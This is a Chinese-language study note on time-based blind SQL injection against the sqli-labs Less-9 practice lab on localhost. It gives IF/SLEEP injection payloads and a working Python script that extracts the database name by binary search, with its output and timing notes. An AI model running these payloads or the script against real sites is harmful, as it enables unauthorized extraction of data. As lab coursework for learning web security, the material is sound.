# P1-02 时间盲注（Time-based Blind SQL Injection）

> 日期：2026-10-13 ｜ 环境：sqli-labs Less-9（Docker，`localhost:8083`）｜ 前置：P1-01 布尔盲注

## 一句话原理

当页面**对真/假毫无差异**（两种情况显示完全一样）时，用 `SLEEP()` 把"是/否"编码成"慢/快"：条件为真 → 数据库睡 N 秒 → 响应延迟；条件为假 → 立刻返回。**时间就是信号。**

## 核心函数

```sql
IF(条件, 条件为真时返回, 条件为假时返回)   -- MySQL 三元运算符，必须 3 个参数
SLEEP(N)                                    -- 睡 N 秒，正常结束返回 0
```

```sql
SELECT IF(1=1, SLEEP(3), 0)   -- 真 → 卡 3 秒
SELECT IF(1=2, SLEEP(3), 0)   -- 假 → 秒回
```

> `0` 只是占位符：`IF()` 语法要求 3 个参数。时间盲注里我们根本不在乎返回值（直接丢掉），只在乎 `SLEEP()` 有没有被执行。写成 `1`、`999` 效果一样。

## 实战（Less-9）

```
?id=1' AND IF(1=1,SLEEP(3),0) --+              → 卡 3 秒（真）
?id=1' AND IF(1=2,SLEEP(3),0) --+              → 秒回（假）
?id=1' AND IF(length(database())=8,SLEEP(3),0) --+  → 卡 3 秒，长度为 8
```

## 自动化：复用 blind.py，只改两处

```python
import requests

BASE = "http://localhost:8083/Less-9/"   # ① 换关卡
SLEEP_SEC = 2                            # 睡 2 秒就够，跑得更快

def ask(question):
    """问数据库一个是/否问题：超时=真"""
    payload = f"1' AND IF({question},SLEEP({SLEEP_SEC}),0) -- "
    r = requests.get(BASE, params={"id": payload}, timeout=10)
    return r.elapsed.total_seconds() > SLEEP_SEC * 0.7   # ② 改判断

# ↓↓↓ 二分法部分一字不用改 ↓↓↓（ask 是"是/否"黑盒，底层是关键词还是计时，上层无感）
db_len = next(i for i in range(1, 30) if ask(f"length(database())={i}"))
name = ""
for pos in range(1, db_len + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"ascii(substr(database(),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    name += chr(lo)
print("数据库名:", name)
```

真实运行输出：`security`（8 字母，与 P1-01 一致，约 2 分钟跑完）。

要点：
- `r.elapsed`：requests 自带属性，本次请求耗时（`timedelta` 类型），不用自己掐表。
- `.total_seconds()` 转成带小数的秒。⚠️ 别用 `.seconds`——它只取整数秒部分，丢掉毫秒，计时判断必须用 `total_seconds()`。
- 阈值用 `SLEEP_SEC * 0.7` 而非死线：留 30% 余量，网络抖动不误判——工程习惯。

## 编码分层：`--+` vs `"-- "`

同一东西，处在不同层：

```
Python 里写:   "1' AND ... -- "     ← 真空格
    ↓ requests 自动编码
URL 线上:      ... --+              ← 空格变 +
    ↓ PHP 解码
MySQL 拿到:    ... --               ← + 变回空格，注释生效
```

MySQL 规定 `--` 后必须跟空白字符才算注释。浏览器里手工写 `--+`（自己当编码器），Python 里写真空格（requests 代劳）——**线上的字节一模一样**。记住：URL 编码是传输层的事，SQL 解析是数据库的事，两层别混。

## 代价：慢

时间盲注用时间换隐蔽性：每个"真"答案都要实打实睡 `SLEEP_SEC` 秒。本课约 64 请求、耗时约 2 分钟。优化方向：调小 SLEEP、二分法（已用）、多线程并发（进阶）。
